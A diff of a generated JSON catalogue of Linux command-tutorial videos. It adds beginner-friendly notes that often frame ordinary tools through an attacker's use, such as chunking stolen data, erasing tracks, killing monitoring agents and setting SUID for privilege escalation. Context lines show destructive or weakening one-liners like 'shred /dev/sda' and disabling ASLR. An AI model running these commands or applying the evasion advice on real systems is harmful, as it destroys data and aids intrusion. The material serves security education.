@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-04-20T22:43:39.335300Z",
+  "generated_at": "2026-04-20T23:16:49.628862Z",
   "total_videos": 100,
   "total_tools": 116,
   "hat_counts": {
@@ -35,6 +35,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=ccU8wEOXqZU",
       "extra": false
@@ -87,6 +89,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=uuCYq64Ww7o",
       "extra": false
@@ -133,6 +137,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=j9pE9k715OU",
       "extra": false
@@ -158,6 +164,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=tj_PQw4QwNQ",
       "extra": false
@@ -182,6 +190,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=PeeSsQzPe74",
       "extra": false
@@ -246,6 +256,8 @@
         "crypto"
       ],
       "root_vs_user": {},
+      "beginner_note": "Shows you exactly what is inside a file as raw bytes (hex). Essential for spotting hidden data, understanding file formats, and inspecting shellcode.",
+      "plain_intent": "A tool that shows you the raw contents of any file as numbers (hex). Security researchers use it to look inside malware, find hidden data, and craft custom payloads byte by byte.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=U4Jih6iBdZI",
       "extra": false
@@ -306,6 +318,8 @@
         "root": "Fully functional: `chroot /newroot /bin/bash` — changes root for process and children",
         "user": "Permission denied — chroot(2) syscall requires CAP_SYS_CHROOT"
       },
+      "beginner_note": "Changes what '/' (root) means for a process, giving it a fake filesystem to live in. Escaping this fake root is a classic privilege escalation technique.",
+      "plain_intent": "Changes the 'root' of the filesystem for a process, trapping it in a folder. Attackers study how to escape these traps because the same technique is used in containers and sandboxes.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=hinEjqZuqqg",
       "extra": false
@@ -331,6 +345,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=SHI0TL415R8",
       "extra": false
@@ -394,6 +410,8 @@
         "web"
       ],
       "root_vs_user": {},
+      "beginner_note": "Searches for patterns in text. In security contexts it is used to hunt for passwords, API keys, IP addresses, and indicators of compromise across large volumes of text.",
+      "plain_intent": "Searches files for text patterns. In security, it is used to hunt for passwords, API keys, IP addresses, and other sensitive strings hidden inside config files and logs.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=PD6R1sFVi18",
       "extra": false
@@ -426,6 +444,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=SF6e4fqEDAQ",
       "extra": false
@@ -492,6 +512,8 @@
         "root": "Can create pipes in any directory; can combine with /dev/tcp for raw socket forwarding",
         "user": "Can create pipes in writable dirs; reverse shells still work — privilege is not required"
       },
+      "beginner_note": "Think of this as a two-way pipe between your keyboard and a remote machine — the building block of the classic reverse shell.",
+      "plain_intent": "Creates a special file that acts like a two-way pipe. The most common use in security is building a reverse shell — a connection that lets an attacker type commands on your machine from theirs.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=7scHD-uZ4fI",
       "extra": false
@@ -537,6 +559,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=BXxv5O7Fxo8",
       "extra": false
@@ -598,6 +622,8 @@
         "root": "Can switch to any user without password: `su - victim`",
         "user": "Requires target user's password; `su -` to root requires root password (or sudo config)"
       },
+      "beginner_note": "Switches your current user to another, including root. Requires the target user's password unless you are already root.",
+      "plain_intent": "Lets you become a different user without logging out. The most important target is root. If you know the root password (or have sudo access), one command gives you full control of the system.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=C0OHejfYhfE",
       "extra": false
@@ -664,6 +690,8 @@
         "root": "Persists processes after logout for any user; can redirect to system-wide locations",
         "user": "Works for own processes only; output defaults to ~/nohup.out"
       },
+      "beginner_note": "Keeps a process running after you log out by detaching it from the terminal. Attackers use it to leave background processes running persistently.",
+      "plain_intent": "Makes a process immune to hangups — it keeps running even after you close the terminal. Attackers use it to plant long-running background processes that survive logout.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=kmynjxOFxyc",
       "extra": false
@@ -704,6 +732,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=TBZn3dHokVM",
       "extra": false
@@ -734,6 +764,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=fPy_I9imXgM",
       "extra": false
@@ -782,6 +814,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=B1aoua1jHwI",
       "extra": false
@@ -807,6 +841,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=kBcdC-EN7YI",
       "extra": false
@@ -859,6 +895,8 @@
         "reversing"
       ],
       "root_vs_user": {},
+      "beginner_note": "Shows file contents in various numeric formats (octal, hex, decimal). Older than xxd but still useful for inspecting raw binary data.",
+      "plain_intent": "Shows the raw bytes of a file in different number formats. Older than xxd but useful for inspecting binary files and spotting patterns that are invisible in plain text.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=e2rfgPTMYqw",
       "extra": false
@@ -911,6 +949,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "Changes the SELinux security context label on a file — relevant when trying to bypass SELinux mandatory access controls.",
+      "plain_intent": "Changes the security label SELinux puts on a file. SELinux is an extra layer of access control; changing these labels is one way to bypass it.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=8vYmXJJSjV4",
       "extra": false
@@ -936,6 +976,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=MDW1486I8bc",
       "extra": false
@@ -963,6 +1005,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=5V_YdXp0Zjs",
       "extra": false
@@ -1015,6 +1059,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=e5c5T1egZHc",
       "extra": false
@@ -1041,6 +1087,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=ikxk-CwZROM",
       "extra": false
@@ -1087,6 +1135,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=hFFjCZLkzkM",
       "extra": false
@@ -1111,6 +1161,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=LHIlvCrfZTo",
       "extra": false
@@ -1136,6 +1188,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=95oGJPDebeE",
       "extra": false
@@ -1185,6 +1239,8 @@
       ],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "Runs a command under a different SELinux security context. Understanding this helps you see how SELinux can be abused or bypassed.",
+      "plain_intent": "Runs a program with a different SELinux security label. Understanding it helps you see how Linux's mandatory access controls can be circumvented.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=whUK9M5WF6I",
       "extra": false
@@ -1240,6 +1296,8 @@
         "linux"
       ],
       "root_vs_user": {},
+      "beginner_note": "Runs a command and kills it after a time limit. Attackers use it to make payloads self-destruct or to test time-based sandbox detection.",
+      "plain_intent": "Runs a command and automatically kills it after a set time. Used to make malware self-destruct after a window, or to test whether a sandbox exits payloads early.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=jADPIUsdyd0",
       "extra": false
@@ -1265,6 +1323,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=3AVbGk7h4_c",
       "extra": false
@@ -1290,6 +1350,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=rGSlY1noPqk",
       "extra": false
@@ -1353,6 +1415,8 @@
         "forensics"
       ],
       "root_vs_user": {},
+      "beginner_note": "Transforms any binary data into readable text characters. Not encryption — anyone can decode it instantly. Used to sneak payloads past filters that block binary data.",
+      "plain_intent": "Converts data into a text format made of letters and numbers. It is not encryption — think of it as packing data into a box that looks like random text to sneak past simple content filters.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=m4B_4wR9mzI",
       "extra": false
@@ -1380,6 +1444,8 @@
         "crypto"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=fd1YJ8Pf1Nw",
       "extra": false
@@ -1424,6 +1490,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=zwP_8jTf_ho",
       "extra": false
@@ -1458,6 +1526,8 @@
         "linux"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=T2lwigqssG0",
       "extra": false
@@ -1483,6 +1553,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=aHUxHhYAUEg",
       "extra": false
@@ -1532,6 +1604,8 @@
         "recon"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "Shows or sets the machine's network name. During reconnaissance, running hostname tells you where you are on the network — useful for orienting yourself after landing on a new machine.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=bWCDO0BfJ6E",
       "extra": false
@@ -1560,6 +1634,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=j6nGWNqrZA0",
       "extra": false
@@ -1584,6 +1660,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=SsY08JRGNXA",
       "extra": false
@@ -1641,6 +1719,8 @@
         "forensics"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=SCISgvGBAY0",
       "extra": false
@@ -1661,6 +1741,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=BBetZlfdeJc",
       "extra": false
@@ -1686,6 +1768,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=cq3fgnJMC8c",
       "extra": false
@@ -1717,6 +1801,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=tXPFK-cMKMk",
       "extra": false
@@ -1751,6 +1837,8 @@
         "pwn"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=gSRRKXtl8Ow",
       "extra": false
@@ -1787,6 +1875,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=zQMw6OexIcU",
       "extra": false
@@ -1817,6 +1907,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=a-hmwzAstBs",
       "extra": false
@@ -1842,6 +1934,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=SyylpFY_eSg",
       "extra": false
@@ -1888,6 +1982,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=ZuHw5L3z2sY",
       "extra": false
@@ -1937,6 +2033,8 @@
         "pwn"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=sEVu7FhWiXM",
       "extra": false
@@ -1962,6 +2060,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=SUoUciBypsE",
       "extra": false
@@ -2015,6 +2115,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=BMgQxNkILoE",
       "extra": false
@@ -2065,6 +2167,8 @@
         "linux"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=6NyyBdPSVzg",
       "extra": false
@@ -2124,6 +2228,8 @@
         "root": "Can overwrite protected files: `echo 0 | tee /proc/sys/kernel/randomize_va_space`",
         "user": "Writes only to user-writable paths; sudo tee is a classic privilege escalation vector"
       },
+      "beginner_note": "Reads from stdin and writes to both a file and stdout at once. Because it writes files, 'sudo tee' is a classic way to overwrite protected system files.",
+      "plain_intent": "Sends the same data to two places at once — to the screen and to a file. The trick is that 'sudo tee' can write to protected files that you normally cannot touch.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=kWPahGH98Yg",
       "extra": false
@@ -2174,6 +2280,8 @@
         "forensics"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "Produces a unique fingerprint (hash) for a file. Used to verify that a downloaded file has not been tampered with, and in security to check if a file matches a known malware sample.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=tvv3LMIJf8c",
       "extra": false
@@ -2234,6 +2342,8 @@
         "root": "Can send signals to any process: `kill -9 1` (init), `killall -u victim`",
         "user": "Can only signal own processes — EPERM on other users' PIDs"
       },
+      "beginner_note": "Sends a signal to a process — most commonly signal 9 (SIGKILL) which forces immediate termination. Root can kill any process; regular users can only kill their own.",
+      "plain_intent": "Sends a signal to stop a running process. If you have root privileges, you can stop any process — including antivirus software, logging agents, and monitoring daemons.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=8KAgtlVBPZA",
       "extra": false
@@ -2288,6 +2398,8 @@
         "root": "Shows all processes from all users with full details including kernel threads",
         "user": "Shows own processes fully; other users' processes visible but with limited detail"
       },
+      "beginner_note": "",
+      "plain_intent": "Shows which processes are running and how much CPU and memory they are using. During incident response, an unexpected process in the top list is often the first sign of compromise.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=yH1SursYePg",
       "extra": false
@@ -2313,6 +2425,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=GqJhWMl9gpM",
       "extra": false
@@ -2338,6 +2452,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=p7CB_KZGBrM",
       "extra": false
@@ -2388,6 +2504,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=t-wuNq8XiTQ",
       "extra": false
@@ -2412,6 +2530,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=pg7Z5i75-5c",
       "extra": false
@@ -2444,6 +2564,8 @@
         "linux"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=XOHTyG970Lc",
       "extra": false
@@ -2476,6 +2598,8 @@
         "forensics"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "Produces a hash fingerprint for a file — less secure than sha256sum but still widely used. Attackers check file hashes to confirm payloads arrived intact and to identify malware variants.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=e3DT8-w2gnQ",
       "extra": false
@@ -2528,6 +2652,8 @@
         "linux"
       ],
       "root_vs_user": {},
+      "beginner_note": "Cuts a large file into smaller pieces. Attackers use this to break large payloads or exfiltrated data into chunks that bypass size-based detection.",
+      "plain_intent": "Breaks one big file into many smaller ones. Used to cut large stolen datasets into pieces small enough to pass through email filters or upload size limits without triggering alarms.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=3qQVLQTwADg",
       "extra": false
@@ -2557,6 +2683,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=qTgyS_ClEYs",
       "extra": false
@@ -2587,6 +2715,8 @@
         "root": "Can install to system paths (`/usr/local/bin`) and set ownership/SUID bits during install",
         "user": "Restricted to own-writable directories; cannot set SUID"
       },
+      "beginner_note": "Copies files and sets permissions in one step. The ability to set the SUID bit during install makes it a privilege escalation vector if available via sudo.",
+      "plain_intent": "A 'cp with superpowers' that copies files and sets their permissions in one step. The danger is the ability to set the SUID bit — making a copy of a program that runs as root.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=4wR7BzWuijk",
       "extra": false
@@ -2635,6 +2765,8 @@
         "recon"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "Prints your current username. The first command anyone runs after getting access to a system — you need to know whether you are a regular user or already root.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=1Qso630N7zQ",
       "extra": false
@@ -2659,6 +2791,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=I6w_z6-XuwI",
       "extra": false
@@ -2705,6 +2839,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=Jc5orEuQRBI",
       "extra": false
@@ -2732,6 +2868,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=HGh2drplJwY",
       "extra": false
@@ -2785,6 +2923,8 @@
         "linux"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=zCXkKX2MMGc",
       "extra": false
@@ -2816,6 +2956,8 @@
         "forensics"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=TQ5S6-6PD2k",
       "extra": false
@@ -2871,6 +3013,8 @@
         "linux"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=YCtu7PI3obA",
       "extra": false
@@ -2919,6 +3063,8 @@
       ],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "Changes the buffering behavior of a program's output streams. Used to make output appear in real time and as a behavioral evasion technique.",
+      "plain_intent": "Changes how a program buffers (delays) its output. Used to keep output flowing in real time during an attack, and as a trick to make malicious processes look like normal background jobs.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=VhDjypuEsjY",
       "extra": false
@@ -2965,6 +3111,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=YGNLLS3UB3k",
       "extra": false
@@ -3032,6 +3180,8 @@
         "root": "Can read raw block devices: `dd if=/dev/sda of=disk.img` — full disk clone, bypasses filesystem",
         "user": "Restricted to files within own permissions — cannot read /dev/sda or /dev/mem"
       },
+      "beginner_note": "Like a photocopier for your hard drive — copies everything bit-by-bit, including deleted files that the filesystem thinks are gone.",
+      "plain_intent": "Reads and writes raw data directly, bypassing normal file system rules. Attackers use it to copy entire disks, wipe evidence, or create bootkit payloads that survive reinstalls.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=j95yzoRGxWc",
       "extra": false
@@ -3059,6 +3209,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=dN1uOPydCO4",
       "extra": false
@@ -3084,6 +3236,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=fT-ASLgHVKo",
       "extra": false
@@ -3126,6 +3280,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=x47s05sVNr8",
       "extra": false
@@ -3188,6 +3344,8 @@
         "forensics"
       ],
       "root_vs_user": {},
+      "beginner_note": "Prints file contents to the terminal. Simple but important — reading /etc/passwd, /etc/shadow, or any credential file starts here.",
+      "plain_intent": "Prints a file's contents. Simple but foundational — reading /etc/passwd to list users, reading /etc/shadow for password hashes, and reading config files for credentials all start with cat.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=lTOje2weu_o",
       "extra": false
@@ -3213,6 +3371,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=Rot-_Vwhu1Y",
       "extra": false
@@ -3241,6 +3401,8 @@
         "linux"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=kjqLp7OOzLI",
       "extra": false
@@ -3266,6 +3428,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=bgPAXvnparo",
       "extra": false
@@ -3293,6 +3457,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=MLWCmQJ9dfg",
       "extra": false
@@ -3353,6 +3519,8 @@
         "root": "Can shred raw devices (`shred /dev/sda`) — destroys entire disk; can shred protected logs",
         "user": "Limited to own files; cannot shred /var/log/auth.log without sudo"
       },
+      "beginner_note": "Overwrites a file's data multiple times before deleting it, so forensic recovery tools cannot reconstruct what was there.",
+      "plain_intent": "Destroys a file so thoroughly that even forensic tools cannot recover it. Attackers run this after a breach to erase their tracks before leaving.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=9caYkuU06Cw",
       "extra": false
@@ -3417,6 +3585,8 @@
         "web"
       ],
       "root_vs_user": {},
+      "beginner_note": "Prints text to the terminal. At the heart of the Shellshock vulnerability — injecting commands into an echo call through environment variables was the attack.",
+      "plain_intent": "Prints text to the terminal. It was at the center of the Shellshock vulnerability — specially crafted environment variables caused echo to execute injected commands on web servers.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=7DdEFSrvYv0",
       "extra": false
@@ -3476,6 +3646,8 @@
         "root": "Can set SUID/SGID bits (`chmod u+s /bin/bash`) and change permissions on any file",
         "user": "Can only change permissions on files owned by current user; cannot set SUID on root-owned files"
       },
+      "beginner_note": "Controls who can read, write, or execute a file. The SUID bit is the important one for security — it lets a file run as its owner (often root) regardless of who launches it.",
+      "plain_intent": "Sets who is allowed to read, write, or run a file. The SUID permission bit is the critical one — it causes a program to run as its owner (often root) no matter who actually runs it.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=QUIWbXYTp4Y",
       "extra": false
@@ -3521,6 +3693,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=knykP_7rS6s",
       "extra": false
@@ -3567,6 +3741,8 @@
         "recon"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=Z0-u5lmy7wo",
       "extra": false
@@ -3597,6 +3773,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=sCm0jez-Pko",
       "extra": false
@@ -3624,6 +3802,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=2fCzfhj0PiQ",
       "extra": false
@@ -3679,6 +3859,8 @@
         "crypto"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=YBZWdeu-g8M",
       "extra": false
@@ -3710,6 +3892,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=nkTp3Ew5GMw",
       "extra": false
@@ -3740,6 +3924,8 @@
         "forensics"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=hhvCUuyKdzg",
       "extra": false
@@ -3786,6 +3972,8 @@
         "forensics"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=M3iyVQ4nq_Q",
       "extra": false
@@ -3834,6 +4022,8 @@
         "linux"
       ],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=XMH3Jv2pGZc",
       "extra": false
@@ -3884,6 +4074,8 @@
         "forensics"
       ],
       "root_vs_user": {},
+      "beginner_note": "Same idea as base64 but uses a different alphabet. Less recognized by security tools than base64, which is exactly why it is useful for evasion.",
+      "plain_intent": "Same as base64 but uses a different set of characters. Less well-known, so security tools are less likely to flag it — useful for hiding payloads in plain sight.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=xl8zXcPJTvg",
       "extra": false
@@ -3911,6 +4103,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=_A0W7gYEgJg",
       "extra": false
@@ -3966,6 +4160,8 @@
         "pwn"
       ],
       "root_vs_user": {},
+      "beginner_note": "Creates links between files. Hard links and symbolic links can be used to trick privileged processes into reading or writing files they should not touch.",
